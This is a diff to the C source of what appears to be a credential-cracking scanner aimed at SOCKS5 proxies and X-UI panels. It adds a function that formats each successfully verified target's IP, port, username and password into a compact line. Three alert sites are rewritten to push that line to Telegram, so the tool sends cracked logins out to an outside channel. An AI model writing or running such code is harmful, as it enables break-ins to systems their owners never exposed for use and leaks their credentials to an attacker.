@@ -756,6 +756,22 @@ static int should_push_verified_now(uint64_t total_verified) {
     return (total_verified % (uint64_t)threshold) == 0;
 }
 
+static void format_compact_verified_line(const char *ip, uint16_t port,
+                                         const char *user, const char *pass,
+                                         const char *asn_in,
+                                         char *out, size_t out_sz) {
+    if (!out || out_sz == 0) return;
+    const char *u = (user && *user) ? user : "-";
+    const char *p = (pass && *pass) ? pass : "-";
+    const char *asn = (asn_in && *asn_in) ? asn_in : "-";
+
+    if (strchr(u, ':') && strchr(p, ':') && strcmp(u, p) == 0) {
+        snprintf(out, out_sz, "%s:%u:%s %s", ip ? ip : "-", (unsigned)port, u, asn);
+    } else {
+        snprintf(out, out_sz, "%s:%u:%s:%s %s", ip ? ip : "-", (unsigned)port, u, p, asn);
+    }
+}
+
 static void scanner_run_verify_logic(const verify_task_t *task) {
     if (!task) return;
 
@@ -795,9 +811,9 @@ static void scanner_run_verify_logic(const verify_task_t *task) {
 
                 if (should_push_verified_now(g_state.total_verified)) {
                     char msg[1024];
-                    snprintf(msg, sizeof(msg), "<b>[S5_VERIFIED] 发现可用节点</b>\n<code>%s:%d:%s:%s</code>\n阈值推送:%d",
-                             task->ip, task->port, task->creds[i].username, task->creds[i].password,
-                             g_config.telegram_verified_threshold);
+                    format_compact_verified_line(task->ip, task->port,
+                                                 task->creds[i].username, task->creds[i].password,
+                                                 "-", msg, sizeof(msg));
                     push_telegram(msg);
                 }
                 verified = 1;
@@ -856,9 +872,9 @@ static void scanner_run_verify_logic(const verify_task_t *task) {
 
                 if (should_push_verified_now(g_state.total_verified)) {
                     char msg[1024];
-                    snprintf(msg, sizeof(msg), "<b>[XUI_VERIFIED] 高危漏洞触发</b>\nURL: <code>http://%s:%d</code>\n账号: <code>%s</code>\n密码: <code>%s</code>\n阈值推送:%d",
-                             task->ip, task->port, task->creds[i].username, task->creds[i].password,
-                             g_config.telegram_verified_threshold);
+                    format_compact_verified_line(task->ip, task->port,
+                                                 task->creds[i].username, task->creds[i].password,
+                                                 "-", msg, sizeof(msg));
                     push_telegram(msg);
                 }
 
@@ -890,9 +906,9 @@ static void scanner_run_verify_logic(const verify_task_t *task) {
 
                     if (should_push_verified_now(g_state.total_verified)) {
                         char msg[1024];
-                        snprintf(msg, sizeof(msg), "<b>[S5_VERIFIED] 发现可用节点</b>\n<code>%s:%d:%s:%s</code>\n阈值推送:%d",
-                                 task->ip, task->port, task->creds[i].username, task->creds[i].password,
-                                 g_config.telegram_verified_threshold);
+                        format_compact_verified_line(task->ip, task->port,
+                                                     task->creds[i].username, task->creds[i].password,
+                                                     "-", msg, sizeof(msg));
                         push_telegram(msg);
                     }
                     break;
